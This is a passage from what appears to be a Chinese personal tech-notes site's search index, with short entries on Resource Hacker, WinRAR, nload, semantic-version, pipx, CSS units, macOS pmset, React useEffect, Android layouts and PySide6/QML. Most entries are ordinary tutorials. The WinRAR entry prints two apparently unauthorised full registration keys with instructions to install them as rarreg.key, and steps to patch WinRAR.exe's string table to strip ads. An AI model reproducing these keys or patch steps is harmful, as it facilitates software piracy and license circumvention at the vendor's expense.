应用程序的资源编辑器。它既是资源编译器 (对于 *.rc 文件),\n又是反编译器 – 可用于可执行文件(*.exe; *.dll; *.scr; 等)中资源的查看和编辑，\n以及编译资源库 (*.res, *.mui)。虽然 Resource Hacker(TM) 主要是 GUI 应用程序, 但它还提供了许多用于从命令行编译和反编译资源的选项。 相关资源:: 下载地址: https://angusj.com/resourcehacker/ 作者: Angus Johnson 优秀资源编辑器 | Resource Hacker","tags":"工具软件","url":"/yq-util-Resource-Hacker.html","loc":"/yq-util-Resource-Hacker.html"},{"title":"winrar使用","text":"winrar下载后是有一个默认的40天评估的,\n且现在的中文简体版, 大部分即使激活了也会有广告 激活 后无广告版本相关资源 推荐的7.0版本下载地址: https://www.win-rar.com/fileadmin/winrar-versions/sc/sc20240306/wrr/winrar-x64-700sc.exe 其他版本可看此页面: https://github.com/n2far2000/winrarsc 下载后正常安装即可. 激活码注册 可用的激活/注册码 注册码1: RAR registration data\nAdmin\nUnlimited Company License\nUID=1d7426b0b166c91c21ab\n641221225021abd0925f7c70456ecd71f724a7f5a00b0a0f7d19ee\n45c5e20951dae2857c2960fce6cb5ffde62890079861be57638717\n7131ced835ed65cc743d9777f2ea71a8e32c7e593cf66794343565\nb41bcf56929486b8bcdac33d50ecf773996076c281ccab247f6153\ned97a3e4a4cb9bffbf35ed364a5cc6908fd2cdc84e9f53a33cf463\n9d85cd75291397987399f5159745c84654dfd11e471ec7a360b22a\nbbaf66105e62e8afa2d5d154b0c164b1f5377d2975460025531542 注册码2: RAR registration data\nFederal Agency for Education\n1000000 PC usage license\nUID=b621cca9a84bc5deffbf\n6412612250ffbf533df6db2dfe8ccc3aae5362c06d54762105357d\n5e3b1489e751c76bf6e0640001014be50a52303fed29664b074145\n7e567d04159ad8defc3fb6edf32831fd1966f72c21c0c53c02fbbb\n2f91cfca671d9c482b11b8ac3281cb21378e85606494da349941fa\ne9ee328f12dc73e90b6356b921fbfb8522d6562a6a4b97e8ef6c9f\nfb866be1e3826b5aa126a4d2bfe9336ad63003fc0e71c307fc2c60\n64416495d4c55a0cc82d402110498da970812063934815d81470829275 使用方法 复制任意一注册码 新建文本文档, 粘贴到新建的文本文档，保存为 rarreg.key (注意后缀) 将授权文件复制到 Winrar 的安装根目录中, 存在替换即可 参考:: 永久授权Winrar专用激活KEY方法(rarreg.key) 永久授权Winrar专用激活KEY方法(rarreg.key)2 与上一个一样 教你一招，轻松激活Winrar 有广告版本去广告 适用于在上面的资源失效情况, 没失效就忽略此节 下载并安装 Resource Hacker 用 Resource Hacker 打开 WinRAR.exe （ Win+S 搜索 \"WinRAR\" ，然后点击 \"打开文件位置\" 就可以找到 WinRAR 位置 ） 展开 \"String Table\" 项，转到 \"80:2052\" ，然后删除 1277整行 (1277开头) 点击其他任意一项（如 81:2052 ），在弹出的对话框中选择 \"Compile\" 保存更改 再次打开WinRAR，就没有广告 参考: WinRAR最简单的去广告和激活教程","tags":"工具软件","url":"/yq-util-winrar.html","loc":"/yq-util-winrar.html"},{"title":"Antd","text":"官网: https://ant-design.antgroup.com/index-cn","tags":"前端","url":"/yq-docs-front-end-frame-antd-index.html","loc":"/yq-docs-front-end-frame-antd-index.html"},{"title":"nload","text":"可用于查看实时网速 安装 sudo apt install nload 使用 查看所有网卡的实时网速 nload -m 查看指定网卡的实时网速 nload -m eth0 注解 查看所有网卡时，切换网卡：左右方向键（按左右键显示 截图最上方 1/3、2/3、3/3 查看不同网卡速度） 选项参数 -m 只显示统计数据(推荐)，不显示流量图","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-nload.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-nload.html"},{"title":"semantic-version","text":"pypi地址: https://pypi.org/project/semantic-version/ 安装 pip install semantic-version 使用 次模块的操作基本依赖于 semantic_version.Version 模块 如 >>> import semantic_version >>> v = semantic_version . Version ( '0.1.1' ) >>> v . major 0 >>> v . minor 1 >>> v . patch 1 >>> v . prerelease [] >>> v . build [] >>> list ( v ) [ 0 , 1 , 1 , [], []] 使用 Version 直接实例化时, 字符串必须是符合 semver 规范的(比如 0.1 就不行, 至少三位) >>> semantic_version . Version ( '0.1' ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/Users/rbarrois/dev/semantic_version/src/semantic_version/base.py\" , line 64 , in __init__ major , minor , patch , prerelease , build = self . parse ( version_string , partial ) File \"/Users/rbarrois/dev/semantic_version/src/semantic_version/base.py\" , line 86 , in parse raise ValueError ( 'Invalid version string: %r ' % version_string ) ValueError : Invalid version string : '0.1' 还可以使用字典参数 >>> from semantic_version import Version >>> semantic_version . Version ( major = 0 , minor = 1 , patch = 2 ) # Version('0.1.2') Version ( '0.1.2' ) >>> semantic_version . Version ( major = 0 , minor = 1 , patch = 2 , prerelease = ( 'alpha' , '2' )) Version ( '0.1.2-alpha.2' ) 如果原来的字符串是不支持直接实例的, 可以使用 coerce >>> Version . coerce ( '0' ) Version ( '0.0.0' ) >>> Version . coerce ( '0.1.2.3.4' ) Version ( '0.1.2+3.4' ) >>> Version . coerce ( '0.1.2a3' ) Version ( '0.1.2-a3' ) 支持直接比较 >>> semantic_version . Version ( '0.1.1' ) < semantic_version . Version ( '0.1.2' ) True >>> semantic_version . Version ( '0.1.1' ) > semantic_version . Version ( '0.1.1-alpha' ) True >>> semantic_version . Version ( '0.1.1' ) <= semantic_version . Version ( '0.1.1-alpha' ) False 还可以获取后续版本 >>> v = semantic_version . Version ( '0.1.1+build' ) >>> new_v = v . next_major () >>> str ( new_v ) '1.0.0' >>> v = semantic_version . Version ( '1.1.1+build' ) >>> new_v = v . next_minor () >>> str ( new_v ) '1.2.0' >>> v = semantic_version . Version ( '1.1.1+build' ) >>> new_v = v . next_patch () >>> str ( new_v ) '1.1.2' 版本判断是否在某个区间 >>> Version ( '0.1.2' ) in NpmSpec ( '0.1.0-alpha.2 .. 0.2.4' ) True >>> Version ( '0.1.2' ) in NpmSpec ( '>=0.1.1 <0.1.3 || 2.x' ) True >>> Version ( '2.3.4' ) in NpmSpec ( '>=0.1.1 <0.1.3 || 2.x' ) True API 类 SimpleSpec The SimpleSpec class provides a simple, easily understood scheme – somewhat inspired from PyPI range notations; SimpleSpec 提供一个简单易理解的方案，一些灵感来源于PyPI范围 notation; 简单的直接使用比较字符串 >>> s = SimpleSpec ( '>=0.1.1' ) # At least 0.1.1 >>> s . match ( Version ( '0.1.1' )) True >>> s . match ( Version ( '0.1.1-alpha1' )) # pre-release doesn't satisfy version spec False >>> s . match ( Version ( '0.1.0' )) False 联合版本可以这样定义 >>> SimpleSpec ( '>=0.1.1,<0.3.0' ) in 语法同样可用 >>> s = SimpleSpec ( '==0.1.1' ) >>> Version ( '0.1.1+git7ccc72' ) in s # build variants are equivalent to full versions True >>> Version ( '0.1.1-alpha1' ) in s # pre-release variants don't match the full version. False >>> Version ( '0.1.2' ) in s False SimpleSpec.filter 版本比较过滤 从迭代中过滤符合条件的 >>> s = SimpleSpec ( '>=0.1.0,<0.4.0' ) >>> versions = ( Version ( '0. %d .0' % i ) for i in range ( 6 )) >>> for v in s . filter ( versions ): ... print v 0.1.0 0.2.0 0.3.0 SimpleSpec.select 选择符合要求的最新版本 >>> s = SimpleSpec ( '>=0.1.0,<0.4.0' ) >>> versions = ( Version ( '0. %d .0' % i ) for i in range ( 6 )) >>> s . select ( versions ) Version ( '0.3.0' ) NpmSpec The NpmSpec class supports the whole NPM range specification scheme: NpmSpec 支持整个NPM范围 specification scheme: 函数","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-semantic-version.html","loc":"/yq-docs-rear-end-python-python-standard-library-semantic-version.html"},{"title":"Python问题总结","text":"python重写父类参数列表问题 Sphinx使用 字符串补0 包管理器安装问题 系统: MacOS 详细报错: $ pip install ipython\n\nerror: externally-managed-environment\n\n× This environment is externally managed\n╰─> To install Python packages system-wide, try brew install\n  xyz, where xyz is the package you are trying to\n  install.\n\n  If you wish to install a Python library that isn't in Homebrew,\n  use a virtual environment:\n\n  python3 -m venv path/to/venv\n  source path/to/venv/bin/activate\n  python3 -m pip install xyz\n\n  If you wish to install a Python application that isn't in Homebrew,\n  it may be easiest to use 'pipx install xyz', which will manage a\n  virtual environment for you. You can install pipx with\n\n  brew install pipx\n\n  You may restore the old behavior of pip by passing\n  the '--break-system-packages' flag to pip, or by adding\n  'break-system-packages = true' to your pip.conf file. The latter\n  will permanently disable this error.\n\n  If you disable this error, we STRONGLY recommend that you additionally\n  pass the '--user' flag to pip, or set 'user = true' in your pip.conf\n  file. Failure to do this can result in a broken Homebrew installation.\n\n  Read more about this behavior here: <https://peps.python.org/pep-0668/>\n\nnote: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.\nhint: See PEP 668 for the detailed specification. 说明: 避免系统某些依赖于Python模块的包于需要安装的包存在冲突，这些冲突包括 Python 级 API 不兼容和文件所有权冲突 参考: 新版ubuntu使用pip时发生的错误 解决: 使用 pipx 或者使用 虚拟环境 (其实是一个东西, pipx 相对更方便)","tags":"后端; python","url":"/yq-docs-rear-end-python-conclusion-of-issue-index.html","loc":"/yq-docs-rear-end-python-conclusion-of-issue-index.html"},{"title":"pipx","text":"官网: https://pipx.pypa.io/stable/ 作用 类似于 pip 与 venv 的结合体, 使用 pipx 指令时, 会自动创建虚拟环境在 ~/.local . 二进制文件默认位于 ~/.local/bin , 虚拟环境相当于自动激活, 可使用环境变量 PIPX_BIN_DIR 进行更改，或者执行如下命令( python3 -m userpath append ${you_path} ) 虚拟环境的保存位置：默认是 ~/.local/pipx ，可使用环境变量 PIPX_HOME 进行更改 安装 MacOS brew install pipx # 将 pipx 虚拟环境下的 $PATH 加入到系统中 pipx ensurepath Windows 可以通过 Scoop 来安装 scoop bucket add pipx-standalone https://github.com/uranusjr/pipx-standalone.git\nscoop install pipx\n\npipx ensurepath Ubuntu sudo apt-get update\nsudo apt-get install python-pipx # 将 pipx 虚拟环境下的 $PATH 加入到系统中 pipx ensurepath","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-PIPx.html","loc":"/yq-docs-rear-end-python-python-standard-library-PIPx.html"},{"title":"前端HTML长度单位","text":"注解 源于AI px（像素） 像素是最常见的长度单位，表示屏幕上的一个物理像素点。 px 是绝对单位，其大小在不同的显示设备上是固定的。 em em 是相对单位，它是相对于当前元素的字体大小（font-size）的倍数。\n例如， 1em 等于当前元素的字体大小， 0.5em 等于当前元素字体大小的一半。 em 单位可以用于设置元素的宽度、高度、边距等属性。 rem rem 也是相对单位，它是相对于根元素（通常是 <html> 元素）的字体大小（font-size）的倍数。\n相对于 em 单位， rem 单位更具有可控性，因为它的值不会受到嵌套层级的影响。 %（百分比） 百分比单位是相对单位，用于相对于父元素的尺寸进行计算。\n例如，设置一个元素的宽度为 50% 表示该元素的宽度将是其父元素宽度的一半。 vw 和 vh vw 和 vh 是视窗单位，表示视窗（浏览器窗口或移动设备屏幕）的宽度和高度的百分比。 1vw 等于视窗宽度的 1% ， 1vh 等于视窗高度的 1% 。\n这些单位常用于响应式设计，以实现根据视窗大小自适应的布局。 pt（点） 点是印刷行业常用的单位， 1pt 等于 1/72 英寸。\n在 Web 开发中， 1pt 大约等于 1.33px 。 cm、mm、in（英寸） 这些单位用于表示实际物理尺寸。 cm 表示厘米， 1cm 等于 10mm ； mm 表示毫米； in 表示英寸，1英寸 等于 2.54cm 。","tags":"前端","url":"/yq-docs-front-end-Conceptual-html-length-unit.html","loc":"/yq-docs-front-end-Conceptual-html-length-unit.html"},{"title":"pmset","text":"先简单提一下Mac的工作模式, 顺序为 工作 工作模式 休眠-sleep 当你长时间不操作 Mac 或把 MacBook 的盖子合上或点击 Apple Logo 菜单下的 Sleep 选项，系统会进入「休眠」状态，由于数据仍存储在内存中，此时系统可以被快速唤醒，快速恢复到休眠前的状态。 睡眠-hibernate 在「休眠」一段时间后，Mac 会根据你的设定进入更深一层的 「睡眠」 状态，\n此时 Mac 会考虑将内存中的数据作为一个镜像写入到硬盘中（GB 级别大小），\n然后放弃内存供电，达到更加省电的目的。此时唤醒系统，数据需要从硬盘重新装载至内存，耗时长，速度慢。 用法 sudo pmset [ -选项 ] <参数> 选项 -a 调整任何条件下的睡眠计划 -c 调整外部供电的睡眠计划 -b 调整电池供电的睡眠计划 -g 查看计划 常用参数 🎨 sleep sleep 控制进入休眠所需要的空闲时间 🎨 hibernatemode hibernatemode supports values of 0, 3, or 25. Whether or not a hibernation image gets written is also dependent on the values of standby and autopoweroff. hibernatemode 负责管理睡眠模式。值得注意的是，休眠时的内存镜像是否写入硬盘，除了受 hibernatemode 的控制，还和 standby 以及 autopoweroff 的值有关。 hibernatemode 有 3 种休眠模式可选择 hibernatemode = 0 iMac, Mac Mini等 Mac桌面设备默认参数 持续向内存供电，将数据保留在内存 唤醒速度快，减少硬盘占用 数据有丢失风险 耗电量大 hibernatemode = 25 将数据写入硬盘 不向内存供电，将内存镜像直接写入硬盘 数据不易丢失，镜像占用硬盘空间 唤醒速度慢 耗电量少 hibernatemode = 3 MacBook 笔记本设备默认参数 safe sleep, 数据既写入内存又写入硬盘 持续向内存供电 唤醒时，根据设备电量自动选择从 内存/硬盘 恢复 🎨 standby standby causes kernel power management to automatically hibernate a machine after it has slept for a specified time period. standby 是 Mac 在休眠时的计时器，当满足时间条件，Mac就会由「休眠」状态转至「睡眠」状态。 standby模式需要以下条件： 电池供电 没有外接设备 没有网络活动 没有外接显示器 在满足条件的前提下， standbydelayhigh/low 秒后，会进行睡眠。比较人性化的的一点是，standby 提供了两个倒计时，通过一个阈值 (highstandbythreshold) 进行控制。 🎨 highstandbythreshold highstandbythreshold(电池剩余电量百分比)它是standbydelay模式选择阈值，默认 50% 电量。 高于阈值，采用 standbydelayhigh 计算时间。 低于阈值，采用 standbydelaylow 计算时间。 🎨 autopoweroff autopoweroff is enabled by default on supported platforms as an implementation of Lot 6 to the European Energy-related Products Directive. After sleeping for <autopoweroffdelay> seconds, the system will write a hibernation image and go into a lower power chipset sleep. Wakeups from this state will take longer than wakeups from regular sleep. autppoweroff 是为了满足 欧盟能源效率 Lot 6 条例（关于待机和关闭模式的要求）而设计的，但并不是全部设备都有这个这个设定，需要通过 pmset -g cap 查看是否能调节此项参数。 autopoweroff模式需要满足以下条件： 外部电源供电 没有外接设备 没有网络活动 在满足条件的前提下, autopoweroffdelay秒后，系统会写入内存镜像然后睡眠。与上文提到的 standby 不同，autppoweroff 更多是为了连接外部电源充电时设计的。 🎨 gpuswitch gpuswitch 这个参数用于管理显卡的选择，适合有独立显卡/外置显卡的 Mac gpuswitch=0 只使用集成显卡 gpuswitch=1 只使用独立显卡 gpuswitch=2 自动切换显卡 调节这个参数可以避免在电池供电时使用耗电量高的独立显卡，以节省电量。 其他常用参数 lidwake：开盖时是否唤醒 tcpkeepalive：合盖时是否保存网络连接 displaysleep：屏幕休眠时间 disksleep： 硬盘休眠时间 acwake: 被同一 iCloud ID 下的设备唤醒 常用 pmset -g custom # 查看当前所有睡眠计划 pmset -g cap # 查看当前供电条件下可以调节的参数 sudo pmset restoredefaults # 还原全部设置 参考:: 通过 pmset 工具管理 masOS 睡眠，让你的 Mac 睡得更好 MacBook Pro合上盖子不休眠的问题简单分析","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-pmset.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-pmset.html"},{"title":"useEffect","text":"为组件添加副作用的操作 比如，每次渲染之后，修改网站的标题: function Example() {\n  const [count, setCount] = useState(0);\n\n  useEffect(() => {\n    document.title = `You clicked ${count} times`;\n  });\n} 觉得每次渲染都执行开销太大, 还可以仅在count更新的时候执行(使用第二个参数即可): useEffect(() => {\n  document.title = `You clicked ${count} times`;\n}, [count]); 表示只有当count变化的时候，重新执行副作用.\n其生命周期横跨所有的渲染过程. 即使组件重新触发渲染了, 只要 `count` 没有变化，也不会执行副作用 . 有时候我们会希望 useEffect 只在第一次渲染时候执行一次 ，\n例如 componentDidMount ，第二个参数设置成空数组: useEffect(() => {\n    console.log('组件Mounted');\n}, []);\n// 如果想每一次渲染都触发, 去掉第二个参数 [] 注解 可以使用多个 useEffect 作为不同的 hooks 让逻辑分离 如果需要消除 effect , 返回函数即可","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-useeffect.html","loc":"/yq-docs-front-end-frame-react-hooks-useeffect.html"},{"title":"安卓相关","text":"镜像文件解包 一些UI相关的了解 一些XML配置属性 参考: https://www.runoob.com/w3cnote/android-tutorial-intro.html 结构 新建工程后主要的几个文件 app/src/main/AndroidManifest.xml : 整个程序的描述文件 src 下的 MainActivity.java : 后端逻辑 res 下的 layout 文件夹: UI布局, 默认是 activity_main.xml . 一般UI界面就是在这里绘制 res 下的 values 文件夹: 配置文件, 比如字符串定义默认是 strings.xml Activity布局 主要有6大布局 LinearLayout(线性布局) 线性布局, 也可以说是水平/垂直布局 属性 android:orientation : 布局方向, 默认是垂直 vertical , 还有 horizontal android:id : 布局id, 可使用 @+id/xxx 创建 android:layout_width : 布局宽度, 默认是 match_parent android:layout_height : 布局高度, 默认是 match_parent , 还支持 wrap_content , fill_parent android:gravity : 布局子组件的内容对齐方式, 默认是 center android:layout_margin : 布局外边距, 默认是 0dp android:layout_marginTop : 布局上外边距, 默认是 0dp android:layout_marginBottom : 布局下外边距, 默认是 0dp android:layout_marginLeft : 布局左外边距, 默认是 0dp android:layout_marginRight : 布局右外边距, 默认是 0dp android:layout_marginStart : 布局开始外边距, 默认是 0dp android:layout_marginEnd : 布局结束外边距, 默认是 0dp android:layout_weight : 配置权重, 可以理解为在当前行中, 占比大小. 需要与父布局的 android:layout_width 或者 android:layout_height 配合使用,\n如水平方向的权重分配, 需要将宽度设置为0 android:layout_width=\"0dp\" android:layout_weight=\"1\" RelativeLayout(相对布局) 参考: RelativeLayout(相对布局) TableLayout(表格布局) 参考: TableLayout(表格布局) 相对 GridLayout 是一个比较老的布局组件, 不能直接设置几行几列, 可以不用管这个. 如果我们直接往 TableLayout 中添加组件的话,那么这个组件将占满一行！！！ 如果我们想一行上有多个组件的话,就要添加一个 TableRow 的容器,把组件都丢到里面！ tablerow 中的组件个数就决定了该行有多少列, 而列的宽度由该列中最宽的单元格决定 tablerow 的 layout_width 属性, 默认是 fill_parent 的,我们自己设置成其他的值也不会生效！！！ 但是 layout_height 默认是 wrapten——content 的,我们却可以自己设置大小！ 整个表格布局的宽度取决于父容器的宽度(占满父容器本身) 一个tablerow一行,一个单独的组件也一行！多少列则是看 tableRow 中 的组件个数,组件最多的就是 TableLayout 的列数 属性 android:collapseColumns : 设置需要被 隐藏 的列的序号(从0开始, 下同) android:shrinkColumns : 设置允许被 收缩 的列的列序号 android:stretchColumns : 设置运行被 拉伸 的列的列序号 android:layout_column=\"2\" : 表示的就是 跳过 第二个,直接显示到第三个格子处, 从1开始算的! android:layout_span=\"4\" : 表示 合并 4个单元格,也就说这个组件占4个单元格 FrameLayout(帧布局) 参考: https://www.runoob.com/w3cnote/android-tutorial-framelayout.html 六大布局中最为简单的一个布局,这个布局直接在屏幕上开辟出一块空白的区域,当我们往里面添加控件的时候,会默认把他们放到这块区域的左上角,\n而这种布局方式却没有任何的定位方式,所以它应用的场景并不多;\n帧布局的大小由控件中最大的子控件决定,如果控件的大小一样大的话,那么同一时刻就只能看到最上面的那个组件!\n后续添加的控件会覆盖前一个!虽然默认会将控件放置在左上角,但是我们也可以通过layout_gravity属性,指定到其他的位置! 属性: android:foreground : 设置改帧布局容器的前景图像 android:foregroundGravity : 设置前景图像显示的位置 AbsoluteLayout(绝对布局) GridLayout(网格布局) 参考: https://www.runoob.com/w3cnote/android-tutorial-gridlayout.html 可以自己设置布局中组件的排列方式 可以自定义网格布局有多少行,多少列 可以直接设置组件位于某行某列 可以设置组件横跨几行或者几列.\n组件横跨 多行或者多列的话, 如果要让组件填满横越过的行或列, 需要添加下面这个属性: android:layout_gravity = \"fill\" 其他控件 TextView 属性 android:text : 文本 Button 属性 android:text : 文本 android:onClick : 点击事件, 字符串代表 Activity 中定义的函数, 如 android:onClick=\"Welcome\" 表示 Welcome 函数, 注意修饰符需要是 public 暂未整理属性 android:screenOrientation : 横/竖屏切换\n- unspecified:默认值 由系统来判断显示方向.判定的策略是和设备相关的，所以不同的设备会有不同的显示方向。\n- landscape:横屏显示（宽比高要长）\n- portrait:竖屏显示(高比宽要长)\n- user:用户当前首选的方向\n- behind:和该Activity下面的那个Activity的方向一致(在Activity堆栈中的)\n- sensor:有物理的感应器来决定。如果用户旋转设备这屏幕会横竖屏切换。\n- nosensor:忽略物理感应器，这样就不会随着用户旋转设备而更改了（\"unspecified\"设置除外）。 常见报错 view is not constrained vertically 报错: 此视图不受垂直约束：在运行时，它将跳转到顶部，除非您添加垂直约束更多...(⌘F1), 原输出: This view is not constrained vertically: at runtime it will jump to the top unless you add a vertical constraint More... (⌘F1) 说明视图在垂直方向没有定义与父组件的布局关系. 可以试下增加垂直方向的约束 app:layout_constraintTop_toTopOf=\"parent\" 所有方向约束 app:layout_constraintBottom_toBottomOf=\"parent\"\napp:layout_constraintEnd_toEndOf=\"parent\"\napp:layout_constraintStart_toStartOf=\"parent\"\napp:layout_constraintTop_toTopOf=\"parent\"","tags":"操作系统","url":"/yq-docs-operating-system-Android-index.html","loc":"/yq-docs-operating-system-Android-index.html"},{"title":"跨QML父子组件信号传递","text":"子组件调用父组件信号 子组件 Child.qml Item { // 定义信号, 如果没有参数可以不写括号, 如 signal nextEnabled signal nextEnabled ( bool enable ) Button { text: \"next\" onClick: { // 子组件发出信号 nextEnabled ( true ) } } } 父组件使用 Item { Child { // 重点, // 1. 父组件只能将子组件的信号定义在这个子组件. 不能使用 Connections 定义在别处, 否则找不到. // 2. 用 on 开头加大写的信号名 onNextEnabled: { // 父组件接收信号, 有参数就直接写 信号定义处 定义的参数 console . log ( \"nextEnabled: \" , enable ) } // 如果带参数的时候, 报错参数没声明, 那就改成函数的形式 // onNextEnabled: function run(enable) { //     console.log(\"nextEnabled: \", enable) // } } } 父组件只能将子组件的信号定义在这个子组件 . 不能使用 Connections 定义在别处, 否则找不到.\n比如报错: QML Connections: Detected function \"onNextEnabled\" in Connections element. This is probably intended to be a signal handler but no signal of the target matches the name.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-cross-qml-parent-child-component-signal-passing.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-cross-qml-parent-child-component-signal-passing.html"},{"title":"自定义组件属性","text":"使用 property 关键字 格式: [readonly] property 类型 变量/属性名: 默认值 类型 支持QML基本类型, QML对象类型, 或者 var 泛型. QML基本类型包括 bool int dobule list real string color url var any enumeration alias variant vector matrix point rect size pointf rectf size 示例 Item { // 未初始化, 默认为0 property int age // 初始化为 Bob property string name: \"Bob\" ... } QML属性绑定 冒号绑定 如 TextField { id: textField } Button { id: button text: textField . text } 其中: text: textField.text 将 textField 的 text 属性绑定到了 button 的 text 上。\n只要前者发生变化（例如用户输入、修改），按钮上的文字就会跟着变动。 优点 简单 缺点: 解绑麻烦 无法绑定不在当前QML文件的对象 使用Binding类型 QML中专门提供了一个类型Binding来实现属性绑定。 TextField { id: textField } Button { id: button } Binding { target: button property: \"text\" value: textField . text } 优点 绑定控制能力强。可以通过 when 属性(bool类型), 决定什么时候有效/无效 可以绑定任意对象(即使是非当前QML) 缺点 代码量大 使用Qt.binding()函数 TextField { id: textField } Button { id: button } Component.onCompleted: { button . text = Qt . binding ( function (){ return textField . text ;}); } 优点: 可以写在任何js执行代码里 缺点 只能运行时绑定 前两种方法都是QML语法申明，QML执行引擎在初始化的时候有机会使用JIT技术和Cache技术进行优化，\n而动态执行的js语句是没法进行这种优化的，因此这种方法的执行效率是三种方法中最低的。 参考: qml-property自定义属性 充分理解QML的属性绑定","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-custom-component-attributes.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use-issuses-custom-component-attributes.html"},{"title":"前端","text":"框架 包管理器 开源图标库 ./css ES6 ./node typescript 内置函数 问题 概念性 记录一些特殊表示字符/符号 空格类: &nbsp;：非断行空格（Non-breaking Space）\n&ensp;：半角宽空格（En Space），宽度约为一个普通英文字符\n&emsp;：全角宽空格（Em Space），宽度约为一个大写字母 M 的宽度\n&thinsp;：窄空格（Thin Space），比普通空格更窄 标点符号与特殊字符: &lt;：小于号（Less Than）\n&gt;：大于号（Greater Than）\n&amp;：与符号（Ampersand）\n&quot;：双引号（Quotation Mark）\n&apos;：单引号（Apostrophe）\n&times;：乘号（Multiplication Sign）\n&divide;：除号（Division Sign）\n&plusmn;：正负号（Plus or Minus Sign）\n&micro;：微米符号（Micro Sign） 其他符号与特殊实体: &copy;：版权符号（Copyright Sign）\n&reg;：注册商标符号（Registered Trademark Sign）\n&trade;：商标符号（Trademark Sign）\n&euro;：欧元符号（Euro Sign）\n&pound;：英镑符号（Pound Sign）\n&yen;：日元符号（Yen Sign）\n&cent;：美分符号（Cent Sign）\n&sect;：小节号（Section Sign）\n&deg;：度数符号（Degree Sign）\n&ndash;：短破折号（En Dash）\n&mdash;：长破折号（Em Dash） HTML标签 大致: <br/>           换行\n<hr/>           横线\n\n<ol>            数字列表\n  <li></li>\n  ...\n</ol>","tags":"前端","url":"/yq-docs-front-end-index.html","loc":"/yq-docs-front-end-index.html"},{"title":"QML实际使用","text":"算是QML系列的第二部分吧.\n第一部分是两年前看官网文档记录了. 最近实际想用QML编程时,\n发现不能通过它来作出一个想要的产品, 所以这里补充一下实际使用相关的东西 大致目录 QML模块 QML与Python通信 QML组件 QML组件-视图组件 QML组件-布局组件 QML布局方式 异步编程 6.5版本之后提供了 QTAsyncio 自定义属性 QML样式 组件设置为单例模式 在文件头加入 pragma Singleton 可能遇到的问题 教程/组件布局 教程/两个ListView在竖直方向上同步滚动 教程/ListView 同时支持纵向和横向滚动 教程/导入其他QML 教程/多组件切换 教程/跨QML父子组件信号传递 可能遇到的报错 报错 _TIPropertyValueIsValid called with 12 on nil context 错误输出: 2024-04-10 14:08:42.315 Python[82035:5858049] _TIPropertyValueIsValid called with 12 on nil context!\n2024-04-10 14:08:42.315 Python[82035:5858049] imkxpc_setApplicationProperty:value:reply: called with incorrect property value 12, bailing.\n2024-04-10 14:08:42.352 Python[82035:5858049] _TIPropertyValueIsValid called with 11 on nil context!\n2024-04-10 14:08:42.352 Python[82035:5858049] imkxpc_setApplicationProperty:value:reply: called with incorrect property value 11, bailing.\n2024-04-10 14:08:42.352 Python[82035:5858049] _TIPropertyValueIsValid called with 12 on nil context!\n2024-04-10 14:08:42.352 Python[82035:5858049] imkxpc_setApplicationProperty:value:reply: called with incorrect property value 12, bailing. 一开始遍查无果, 直到发现 Text input context does not respond to _valueForTIProperty ,\n才意识到是一个毛病, 出现于使用 MacOS 写GUI代码时, 切换英文输入法即可解决 , 但是具体要怎么弄就不知了. 报错: Detected recursive rearrange 说明使用了布局组件, 但是组件之前存在循坏依赖,\n比如父组件定义了大小, 子组件又使用了 parent.width 的情况 完整报错: Qt Quick Layouts: Detected recursive rearrange. Aborting after two iterations. 解决, 将类似 parent.width 的改成不依赖 parent .\n比如改成确定大小. 注意事项 QML 开发与直接使用代码绘制控件是两个东西, 且QML没发直接实例源码的 QtWidgets 控件.\n所以建议最好就是 QML 负责 UI 绘制, 逻辑处理的东西才托管给 Python 在QML事件中, 使用 splice 删除数据某一个元素时候, 视图并不会更新, 必须 手动重新赋值 才能正常触发更新","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QML-use.html"},{"title":"QML与Python通信","text":"QML与Python通信主要通过QObject来实现,\nQObject是QML与Python之间通信的桥梁,\nQObject可以注册到QML中,\n这样就可以在QML中通过QObject来调用Python中的函数,\n也可以在Python中通过QObject来调用QML中的函数. 调用举例 比如定义一个 UtilHelper import urllib.parse from PySide6.QtCore import QObject , Slot , Signal class UtilHelper ( QObject ): _cache : dict = None # 这里定义的信号是交给 QML 来接收的, 在QML中通过 connect 来接收 error = Signal ( str ) scan_dirs = Signal ( list ) set_items = Signal ( list ) @Slot ( str , result = list ) def scan_root_dir ( self , scan_dir : str ) -> list : \"\"\"scan movies\"\"\" # 将url转换为本地路径 scan_dir = urllib . parse . unquote ( urllib . parse . urlparse ( scan_dir ) . path ) # 做一些相应的逻辑处理 return [ ... ] 那么如何在 QML 定义调用及接收相关的处理? qml主动调用python定义的逻辑 // 这里举例, 使用文件夹选择来定义相关处理 FolderDialog { id: folderDialog folder: defaultSelectFolder acceptLabel: \"确定\" rejectLabel: \"取消\" options: FolderDialog . ShowDirsOnly onAccepted: { utilHelper . scan_root_dir ( folder ) } onFolderChanged: { console . log ( \"folder change...\" ) } } qml接收python发送来的消息 // 变量声明 property ListModel scanDirRes: ListModel {} property ListModel curItems: ListModel {} Connections { target: utilHelper // 绑定python的类 ignoreUnknownSignals: true // 取消警告 function onError ( message ) { // 使用 on + 信号名(首字母大写) 作为信号的槽 dirScanLabel . text = message } // 数组数据放到 ListModel 是因为没有原生的list支持. function onScan_dirs ( data ){ console . log ( \"dirs0...\" ) scanDirRes . clear () for ( var i = 0 ; i < data . length ; i ++ ) { scanDirRes . append ({ text: data [ i ] }) } } // 数组数据放到 ListModel 是因为没有原生的list支持. function onSet_items ( data ){ console . log ( \"dirs1...\" ) curItems . clear () for ( var i = 0 ; i < data . length ; i ++ ) { curItems . append ({ text: data [ i ] }) } } } 关联QML与Python 好了. 现在相互调用已经定义好了, 但是现在还有一个问题, 